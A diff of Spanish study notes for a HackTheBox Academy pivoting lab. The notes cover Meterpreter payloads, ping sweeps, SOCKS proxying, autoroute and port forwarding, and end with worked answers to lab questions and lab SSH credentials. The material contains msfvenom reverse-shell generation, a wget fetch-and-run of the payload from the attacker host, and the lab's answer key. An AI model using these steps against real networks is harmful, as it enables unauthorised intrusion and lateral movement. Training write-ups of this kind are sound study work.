@@ -32,7 +32,14 @@ msf6 exploit(multi/handler) > run
 ```
 
 ### Ejecutando el Payload en el Ubuntu PIVOT HOST
-Podemos entonces copiar el "backupjob.elf" en el UBUNTU PIVOT HOST mediante SSH y ejercutarlo para ganar una sesión de meterpreter:
+Podemos entonces copiar el "backupjob.elf" en el UBUNTU PIVOT HOST mediante SSH:
+```shell-session
+Polika4RM@htb[/htb]$ scp backupjob.elf ubuntu@<ipAddressofTarget>:~/
+
+backupjob.elf                                   100% 7168    65.4KB/s   00:00
+```
+
+y ejercutarlo para ganar una sesión de meterpreter:
 ```shell-session
 ubuntu@WebServer:~$ ls
 
@@ -62,7 +69,23 @@ meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 
 Podrían darse situaciones en las que el firewall de un host bloquee el ping (ICMP) y este no nos proporcione respuestas correctas. En estos casos, podemos realizar un escaneo TCP en la red 172.16.5.0/23 con Nmap. 
 
+Alternativas para hacer ping:
+##### 1. PING SWEEP desde terminal Linux
+```shell-session
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
 
+##### 2. Ping SWEEP desde terminal Windows (cmd)
+```cmd-session
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+##### Ping SWEEP desde terminal Windows (PowerSHell)
+```powershell-session
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+```
+
+----
 ## Configurando el MSF's SOCKS Proxy
 En otra sesión de msfconsole (dejamos abierta la anterior del meterpreter) en lugar de usar SSH para el redireccionamiento de puertos, también podemos usar el módulo de enrutamiento post-explotación de Metasploit, "socks_proxy", para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy SOCKS para la versión 4a de SOCKS. Esta configuración de SOCKS iniciará un receptor en el puerto 9050 y enrutará todo el tráfico recibido a través de nuestra sesión de Meterpreter. 
 
@@ -100,7 +123,6 @@ Auxiliary action:
    Proxy  Run a SOCKS proxy server
 ```
 Se deja en segundo plano con "bg"
-
 
 Confirmaremos que está funcionando con:
 ```
@@ -140,6 +162,8 @@ msf6 post(multi/manage/autoroute) > run
 [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
 [*] Post module execution completed
 ```
+Esto lo mando a "bg" background.
+
 
 También es posible agregar rutas con autoroute ejecutando autoroute desde la sesión de Meterpreter:
 ```shell-session
@@ -216,6 +240,7 @@ meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
 ```
 
+Redirige el tráfico que llega a mi máquina atacante al puerto local 3300 y lo envía al puerto 3389 de la máquina 172.16.5.19  
 
 ## Conectándonoes con la máquina víctima a través del localhost del atacante
 Ejecutando ahora un "xfreerdp en nuestro local host:300" podremos crear una sesión de escritorio remoto:
@@ -236,7 +261,7 @@ tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 
 ---
 
 ## Meterpreter: reverse port forwarding
-De forma similar a los redireccionamientos de puertos locales, Metasploit también puede resalizar redireccionamientos de puertos inversos con el siguiente comando:
+De forma similar a los redireccionamientos de puertos locales, Metasploit también puede realizar redireccionamientos de puertos inversos con el siguiente comando:
 ```shell-session
 meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
@@ -245,6 +270,7 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 Este comando permite escuchar en un puerto específico del servidor comprometido (PIVOT HOST) y redireccionar todas las shells entrantes del servidor Ubuntu a nuestro host atacante. 
 Iniciaremos un receptor en un nuevo puerto de nuestra máquina atacante y pediremos al servidor UBUNTU que redireccione todas las solicitudes recibidas por el puerto '1234' a nuestro receptor en el puerto '8081'.
+Le pone el 8081 porque por ahí es por donde la máquina atacante escuchará conexiones de vuelta. Es un número arbitrario.
 
 
 ## Configurando y inicializando el multi/handler.
@@ -298,3 +324,91 @@ C:\>
 ```
 
 Con esto, estableceremos la sesión Meterpreter.
+
+---
+
+**Target(s): 10.129.250.220**
+**SSH to 10.129.250.220 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"**
+**1. What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**
+
+Realizo un escaneo básico de nmap y observo que tengu un servicio SSH y un servicio HTTP.
+```
+map -sCV -Pn -n 10.129.250.220 --open --min-rate 2000
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+```
+
+Genero msfvenom para establecer una sesión de meterpreter, ya que tengo credenciales SSH.
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.176 -f elf -o meterpreter_ubuntu LPORT=8080
+```
+
+Lo comparto por servidor http:
+```
+python3 -m http.server
+```
+
+Y me lo descargo desde una sessión SSH con:
+```
+ssh ubuntu@10.129.250.220
+
+ubuntu@WEB01:~$ wget http://10.10.14.176:8000/meterpreter_ubuntu
+```
+
+Abro un msfconsole desde el atacante y ejecuto:
+```
+msf6 > use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8080
+lport => 8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+```
+
+Ejecutamos desde la sesión de ubuntu el exploit: 
+```
+ubuntu@WEB01:~$ ./meterpreter_ubuntu
+```
+
+Y nos establece la sesión meterpreter correctamente: 
+```
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+[*] Sending stage (3090404 bytes) to 10.129.250.220
+[*] Meterpreter session 1 opened (10.10.14.176:8080 -> 10.129.250.220:42592) at 2025-10-23 04:29:02 -0500
+```
+
+
+En el SSH, realizo un IP A y me doy cuenta que tiene la interfaz 172.16.5.0/23 disponible.
+
+Realizo pues desde meterpreter un: 
+```
+(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+
+Pero me da error. 
+
+Pruebo desde la terminal ssh:
+```
+ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.446 ms
+64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.039 ms
+```
+
+Y me devuelve 2 hosts: 172.16.5.19,172.16.5.129
+
+Respuesta: 172.16.5.19,172.16.5.129
+
+
+
+**2. Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**
+Explicación breve: la máscara 255.255.254.0 (/23) cubre el rango 172.16.4.0 — 172.16.5.255, por tanto incluye a `172.16.5.19`.
+
+Respuesta: `172.16.4.0/255.255.254.0`
